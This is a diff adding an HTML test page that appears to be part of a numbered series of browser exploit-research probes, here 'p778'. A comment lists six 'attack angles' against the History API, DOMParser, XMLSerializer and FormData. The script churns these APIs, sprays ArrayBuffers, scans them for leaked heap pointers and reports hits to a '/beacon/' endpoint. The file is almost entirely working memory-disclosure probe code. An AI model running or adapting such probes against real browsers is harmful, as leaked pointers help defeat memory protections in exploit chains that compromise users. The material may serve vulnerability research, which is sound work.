@@ -1,0 +1,396 @@
+<!--
+  p778: History API / DOMParser / XMLSerializer / FormData internal residue
+
+  history.pushState/replaceState serialize JS values into structured clone
+  buffers stored in the navigation session history. Each call allocates a
+  C++ SerializedScriptValue containing the serialized bytes. Navigating
+  away or calling replaceState frees the previous entry's clone buffer.
+
+  DOMParser.parseFromString allocates a full Document tree from markup
+  string input. The parser (HTMLDocumentParser or XMLParser) creates
+  internal token buffers, tree builder state, and namespace stacks.
+  These intermediate C++ objects are freed when the parser finishes
+  and the temporary Document is GC'd.
+
+  XMLSerializer.serializeToString walks a DOM tree and builds an output
+  string through C++ MarkupAccumulator, which allocates intermediate
+  StringBuilder buffers. Large trees produce large intermediate buffers.
+
+  FormData objects maintain a C++ DOMFormData backing store with
+  name-value pairs. Each entry may hold a string or Blob reference.
+  The backing store uses WTF::Vector for the entry list.
+
+  Attack angles:
+  A) history.pushState with large structured clone data then replaceState.
+  B) DOMParser.parseFromString HTML document parsing buffer residue.
+  C) DOMParser.parseFromString XML with namespaces/entities.
+  D) XMLSerializer on deep DOM trees then GC + spray.
+  E) FormData bulk append/delete backing store churn.
+  F) history.state deserialization repeated read residue.
+
+  CRASH_CLASS: LOW (history, parsing, serialization, no side effects)
+  prior art: p774 (DOM traversal), p776 (Performance API)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p778</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p778-START');
+
+// === Section A: history.pushState structured clone churn ===
+try{
+  b('A-history-pushstate');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    for(var i=0;i<50;i++){
+      var stateObj={
+        round:round,
+        index:i,
+        payload:'state_data_'+round+'_'+i+'_'+'h'.repeat(60+i),
+        nested:{
+          arr:[1,2,3,4,5,i,round],
+          deep:{a:i*3,b:'nested_'+i,c:{d:true,e:null,f:i*1.5}}
+        },
+        tags:[]
+      };
+      for(var j=0;j<10;j++){
+        stateObj.tags.push('tag_'+round+'_'+i+'_'+j+'_'+'t'.repeat(20));
+      }
+      try{
+        history.pushState(stateObj,'','#s'+round+'_'+i);
+      }catch(e){
+        if(i===0&&round===0)b('A pushState_err='+e.message);
+      }
+    }
+
+    if(round===0){
+      b('A pushed 50 states, history.length='+history.length);
+      var st=history.state;
+      if(st)b('A state.round='+st.round+' state.index='+st.index+' tags='+st.tags.length);
+    }
+
+    for(var i=0;i<50;i++){
+      try{
+        history.replaceState({empty:true},'','#r'+round+'_'+i);
+      }catch(e){}
+    }
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var SIZES=[64,96,128,192,256];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('A-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      aHits+=szHits;
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: DOMParser HTML document parsing residue ===
+try{
+  b('B-domparser-html');
+  var bHits=0;
+  var parser=new DOMParser();
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var docs=[];
+      for(var i=0;i<30;i++){
+        var html='<!DOCTYPE html><html><head><title>doc'+round+'_'+i+'</title>';
+        html+='<style>body{margin:0}.c'+i+'{color:red;font-size:'+(10+i)+'px}</style>';
+        html+='</head><body>';
+        for(var j=0;j<20;j++){
+          html+='<div class="c'+i+'" id="el_'+i+'_'+j+'" data-round="'+round+'">';
+          html+='<span>text_'+j+'_'+'p'.repeat(20+j)+'</span>';
+          html+='<a href="#link'+j+'">link_'+j+'</a>';
+          html+='<ul>';
+          for(var k=0;k<5;k++){
+            html+='<li data-k="'+k+'">item_'+k+'_'+'q'.repeat(10)+'</li>';
+          }
+          html+='</ul></div>';
+        }
+        html+='</body></html>';
+
+        var doc=parser.parseFromString(html,'text/html');
+        if(i===0&&round===0){
+          b('B parsed body.children='+doc.body.children.length);
+          b('B title='+doc.title);
+        }
+        docs.push(doc);
+      }
+      docs=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var SIZES=[64,96,128,192];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('B-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      bHits+=szHits;
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: DOMParser XML with namespaces/entities ===
+try{
+  b('C-domparser-xml');
+  var cHits=0;
+  var parser=new DOMParser();
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var docs=[];
+      for(var i=0;i<30;i++){
+        var xml='<?xml version="1.0" encoding="UTF-8"?>';
+        xml+='<root xmlns="http://example.com/ns'+round+'" xmlns:custom="http://example.com/custom'+i+'">';
+        for(var j=0;j<15;j++){
+          xml+='<custom:element id="e'+j+'" custom:attr="val_'+j+'_'+'n'.repeat(15)+'">';
+          xml+='<child xmlns:nested="http://example.com/nested'+j+'">';
+          xml+='<nested:item>text_'+round+'_'+i+'_'+j+'_'+'x'.repeat(20)+'</nested:item>';
+          xml+='</child>';
+          xml+='<data><![CDATA[cdata_content_'+j+'_'+'c'.repeat(30)+']]></data>';
+          xml+='</custom:element>';
+        }
+        xml+='</root>';
+
+        var doc=parser.parseFromString(xml,'application/xml');
+        if(i===0&&round===0){
+          var err=doc.querySelector('parsererror');
+          b('C parsed root.children='+(doc.documentElement?doc.documentElement.children.length:'null')+' parseErr='+(err?'YES':'NO'));
+        }
+        docs.push(doc);
+      }
+      docs=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=128;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('C-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    cHits+=szHits;
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: XMLSerializer on deep DOM trees ===
+try{
+  b('D-xmlserializer');
+  var dHits=0;
+  var serializer=new XMLSerializer();
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var results=[];
+      for(var i=0;i<20;i++){
+        var root=document.createElement('div');
+        root.setAttribute('xmlns','http://www.w3.org/1999/xhtml');
+        function buildDeep(parent,depth){
+          if(depth<=0)return;
+          for(var c=0;c<3;c++){
+            var child=document.createElement('span');
+            child.setAttribute('data-d',String(depth));
+            child.setAttribute('data-c',String(c));
+            child.setAttribute('data-payload','attr_'+depth+'_'+c+'_'+'s'.repeat(15));
+            child.textContent='leaf_'+depth+'_'+c;
+            parent.appendChild(child);
+            buildDeep(child,depth-1);
+          }
+        }
+        buildDeep(root,4);
+
+        var str=serializer.serializeToString(root);
+        if(i===0&&round===0)b('D serialized length='+str.length+' root.children='+root.children.length);
+        results.push(str.length);
+        root=null;
+        str=null;
+      }
+      results=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(128);}
+
+    var SIZES=[96,128,192,256];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('D-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      dHits+=szHits;
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: FormData bulk append/delete churn ===
+try{
+  b('E-formdata');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var forms=[];
+      for(var i=0;i<50;i++){
+        var fd=new FormData();
+        for(var j=0;j<30;j++){
+          fd.append('field_'+j+'_'+i,'value_'+round+'_'+i+'_'+j+'_'+'f'.repeat(30+j));
+        }
+        for(var j=0;j<10;j++){
+          try{
+            var blob=new Blob(['blob_content_'+round+'_'+i+'_'+j+'_'+'b'.repeat(50)],{type:'text/plain'});
+            fd.append('file_'+j,blob,'filename_'+j+'.txt');
+          }catch(e){}
+        }
+
+        if(i===0&&round===0){
+          var count=0;
+          try{
+            var iter=fd.entries();
+            var r=iter.next();
+            while(!r.done){count++;r=iter.next();}
+          }catch(e){
+            fd.forEach(function(){count++;});
+          }
+          b('E entries_per_form='+count);
+        }
+
+        for(var j=0;j<30;j++){
+          try{fd.delete('field_'+j+'_'+i);}catch(e){}
+        }
+        forms.push(fd);
+      }
+      forms=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[48,64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('E-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      eHits+=szHits;
+    }
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: history.state deserialization repeated read ===
+try{
+  b('F-state-deser');
+  var fHits=0;
+
+  var bigState={
+    keys:[],
+    matrix:[]
+  };
+  for(var i=0;i<50;i++){
+    bigState.keys.push('key_'+i+'_'+'k'.repeat(30));
+    var row=[];
+    for(var j=0;j<20;j++){
+      row.push({val:i*20+j,name:'cell_'+i+'_'+j});
+    }
+    bigState.matrix.push(row);
+  }
+
+  try{
+    history.replaceState(bigState,'','#bigstate');
+  }catch(e){
+    b('F replaceState_err='+e.message);
+  }
+
+  for(var round=0;round<5;round++){
+    for(var i=0;i<100;i++){
+      var st=history.state;
+      if(i===0&&round===0&&st){
+        b('F state.keys.length='+st.keys.length+' matrix.length='+st.matrix.length);
+      }
+    }
+
+    try{
+      history.replaceState({cleared:true},'','#cleared'+round);
+    }catch(e){}
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=128;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('F-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    fHits+=szHits;
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p778-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
